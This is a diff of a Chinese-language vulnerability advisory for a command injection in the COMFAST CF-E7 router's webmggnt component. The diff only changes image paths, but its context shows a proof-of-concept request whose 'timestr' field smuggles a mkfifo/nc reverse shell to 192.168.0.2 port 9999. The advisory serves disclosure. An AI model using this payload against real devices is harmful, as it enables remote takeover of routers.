@@ -16,7 +16,7 @@ COMFAST CF-E7 V2.6.0.9 Router中发现了一个命令注入漏洞，攻击者可
 
 触发点位于`webmggnt` 组件中的`sub_41ACCC`方法，此处对于`timestr`字段没有校验就使用`sprintf` 进行了拼接，并使用`system`执行，要求不开启`ntp`。
 
-![](../images/2026-02-07-14-59-49-image.png)
+![](../main/images/2026-02-07-14-59-49-image.png)
 
 ### 概念验证
 
@@ -56,5 +56,6 @@ Priority: u=0
 {"timestr":"2021-10-10 10:10:10\";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.2 9999 >/tmp/f; #","timezone":"UTC-8","zonename":"63","ntp_client_enabled":"0","ntp_servername":"0.openwrt.pool.ntp.org"}
 ```
 
-![](../images/2026-02-07-15-00-33-18e34387-87c6-45b5-b092-800fe7c79032.png)
+![](../main/images/2026-02-07-15-00-33-18e34387-87c6-45b5-b092-800fe7c79032.png)
+
 
